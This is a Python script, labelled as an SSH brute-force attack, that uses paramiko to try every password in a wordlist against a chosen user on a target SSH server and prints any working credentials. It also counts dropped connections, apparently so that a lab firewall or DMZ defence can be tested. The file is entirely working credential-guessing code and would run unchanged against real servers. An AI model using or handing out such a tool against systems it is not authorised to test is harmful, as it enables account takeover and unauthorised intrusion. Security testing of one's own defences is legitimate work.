#!/usr/bin/env python3
"""
SSH brute-force attack.
Run from the Internet host (10.2.0.2) against a DMZ SSH server.
Usage: python3 attack_ssh_bruteforce.py <target_ip> <username> <wordlist>
Example: python3 attack_ssh_bruteforce.py 10.12.0.10 root passwords.txt
"""

import sys
import paramiko
import socket

def try_password(target, username, password, timeout=0.1):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=target,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=timeout,
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, socket.timeout, EOFError):
        # Connection refused, reset, or timed out — likely firewall-dropped
        return None

def brute_force(target, username, wordlist_path):
    with open(wordlist_path) as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Trying {len(passwords)} passwords against {username}@{target}")
    attempts = 0
    dropped = 0

    for pw in passwords:
        attempts += 1
        result = try_password(target, username, pw)
        if result is True:
            print(f"[+] SUCCESS after {attempts} attempts: {username}:{pw}")
            return
        elif result is None:
            dropped += 1
            print(f"[!] Attempt {attempts} ({pw}): connection failed/dropped")
        else:
            print(f"[-] Attempt {attempts} ({pw}): wrong password")

    print(f"\n[*] Done. {attempts} attempts, {dropped} dropped/blocked.")

if __name__ == "__main__":
    target = sys.argv[1]
    username = sys.argv[2]
    wordlist = sys.argv[3]
    brute_force(target, username, wordlist)
